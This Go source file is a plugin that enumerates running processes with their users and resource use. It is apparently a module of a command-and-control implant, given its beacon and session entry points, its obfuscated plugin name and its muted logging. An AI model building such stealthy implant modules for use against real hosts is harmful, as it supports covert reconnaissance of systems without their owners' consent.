package main

import (
	_ "embed"
	"encoding/json"
	"fmt"
	"io"
	"runtime"
	"sort"
	"strings"

	"src/Client/generic/config"
	Logger "src/Client/generic/logger"

	"github.com/shirou/gopsutil/v3/process"

	"src/Client/dynamic/shared"

	hclog "github.com/hashicorp/go-hclog"
	"github.com/hashicorp/go-plugin"
)

//go:embed obfuscate.json
var obfuscateJSON []byte

var pluginName string

const pluginKey = "processes"

func init() {
	pluginName = pluginKey

	type entry struct {
		ObfuscatedName string `json:"obfuscation_name"`
	}
	var m map[string]entry
	if err := json.Unmarshal(obfuscateJSON, &m); err == nil {
		if e, ok := m[pluginKey]; ok {
			if n := strings.TrimSpace(e.ObfuscatedName); n != "" {
				pluginName = n
			}
		}
	}
}

type procInfo struct {
	PID        int32   `json:"pid"`
	Name       string  `json:"name"`
	Exe        string  `json:"exe"`
	Username   string  `json:"username"`
	CPUPercent float64 `json:"cpu_percent"`
	MemRSS     uint64  `json:"mem_rss_bytes"`
	MemPercent float32 `json:"mem_percent"`
	CreateTime int64   `json:"create_time_unix_ms"`
}

func listProcesses() ([]procInfo, error) {
	Logger.Log("Enumerating processes...")
	pids, err := process.Pids()
	if err != nil {
		return nil, err
	}

	infos := make([]procInfo, 0, len(pids))
	for _, pid := range pids {
		p, err := process.NewProcess(pid)
		if err != nil {
			continue
		}

		name, _ := p.Name()
		exe, _ := p.Exe()
		username, _ := p.Username()
		cpu, _ := p.CPUPercent()
		memInfo, _ := p.MemoryInfo()
		memPercent, _ := p.MemoryPercent()
		createTime, _ := p.CreateTime()

		var rss uint64
		if memInfo != nil {
			rss = memInfo.RSS
		}

		infos = append(infos, procInfo{
			PID:        pid,
			Name:       name,
			Exe:        exe,
			Username:   username,
			CPUPercent: cpu,
			MemRSS:     rss,
			MemPercent: memPercent,
			CreateTime: createTime,
		})
	}

	// Sort by CPU desc then by memory percent desc
	sort.Slice(infos, func(i, j int) bool {
		if infos[i].CPUPercent == infos[j].CPUPercent {
			return infos[i].MemPercent > infos[j].MemPercent
		}
		return infos[i].CPUPercent > infos[j].CPUPercent
	})

	Logger.Log(fmt.Sprintf("Collected %d processes on %s", len(infos), runtime.GOOS))
	return infos, nil
}

func formatProcessesTable(infos []procInfo) string {
	var b strings.Builder
	fmt.Fprintf(&b, "PID\tCPU%%\tMEM%%\tRSS\tUSER\tNAME\n")
	for _, pi := range infos {
		fmt.Fprintf(&b, "%d\t%.1f\t%.1f\t%d\t%s\t%s\n", pi.PID, pi.CPUPercent, pi.MemPercent, pi.MemRSS, pi.Username, pi.Name)
	}
	return b.String()
}

// ProcessesCommandImpl implements the shared.Command interface.
type ProcessesCommandImpl struct{}

func (c *ProcessesCommandImpl) Execute(args []string) (string, error) {
	infos, err := listProcesses()
	if err != nil {
		Logger.Error(fmt.Sprintf("process list error: %v", err))
		return "", err
	}
	return formatProcessesTable(infos), nil
}

func (c *ProcessesCommandImpl) ExecuteFromSession(args []string) (string, error) {
	return c.Execute(args)
}

func (c *ProcessesCommandImpl) ExecuteFromBeacon(args []string, data string) (string, error) {
	return c.Execute(args)
}

func main() {
	// Silence plugin logs unless in debug
	var plog hclog.Logger
	if config.IsDebug() {
		plog = hclog.New(&hclog.LoggerOptions{Name: "plugin.processes", Level: hclog.Debug})
	} else {
		plog = hclog.New(&hclog.LoggerOptions{Name: "plugin.processes", Level: hclog.Off, Output: io.Discard})
	}

	plugin.Serve(&plugin.ServeConfig{
		HandshakeConfig: shared.HandshakeConfig,
		Plugins: map[string]plugin.Plugin{
			pluginName: &shared.CommandPlugin{Impl: &ProcessesCommandImpl{}},
		},
		Logger: plog,
	})
}
